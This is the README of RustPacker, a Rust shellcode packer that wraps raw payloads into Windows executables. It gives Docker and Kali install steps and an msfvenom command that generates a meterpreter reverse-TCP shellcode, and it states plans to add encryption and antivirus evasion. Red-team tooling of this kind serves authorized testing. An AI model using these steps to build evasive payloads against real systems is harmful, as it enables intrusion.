# RustPacker
Shellcode packer written in Rust.

## Current state
Functional as it packs a binary file, but useless as I need to add evasion and encryption stuff before it can bypass anything.

## Are you a Rust developer?
If you have some experience with Rust, you're more than welcome to help !
You can help by:
- Review the code for mistakes / improvements
- Opening issues
- Contacting me on Discord for a more in depth review (nariod#4621)

# Quick start

## Podman/Docker setup
Consider using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/).
From any internet-connected OS with either Podman or Docker installed:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `podman build -t rustpacker -f Dockerfile`
- Paste your shellcode file in the `shared` folder
- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.bin -i ct`

For regular use, you can set an alias:
- On Linux host: `alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'`
- Then: `rustpacker -f shared/calc.bin -i ct`

## Manual install on Kali
Install dependencies:
- `sudo apt update && sudo apt upgrade -y`
- `sudo apt install -y libssl-dev librust-openssl-dev musl-tools mingw-w64 cmake libxml2-dev`

Install Rust:
- `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh `
- `source $HOME/.cargo/env`
- `rustup target add x86_64-pc-windows-gnu`

Run RustPacker:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `cargo run -- -f shellcode.bin -i ct`

# Full documentation

## Create shellcode
RustPacker is compatible with any "raw" shellcode.

### Metasploit / MSFvenom
You can generate raw MSF shellcode using msfvenom's raw format. Ex:
- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw -o msf.bin`

## Todo
- [X] Port createThread Rust template
- [X] Port createRemoteThread Rust template
- [X] Debug binary file to Vec<u8>
- [X] Debug compiler -> Done, FFS !
- [X] Packer POC
- [X] Migrate to "std::include_bytes"
- [ ] Add encryption / encoding
- [X] Build dockerfile
- [X] Strip output binaries
- [ ] Support the awesome evasions from https://github.com/memN0ps/mordor-rs
- [ ] Write detailed doc

## Credits
- Rust discord
- StackOverflow
- https://github.com/postrequest/link

## Legal disclaimer
Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
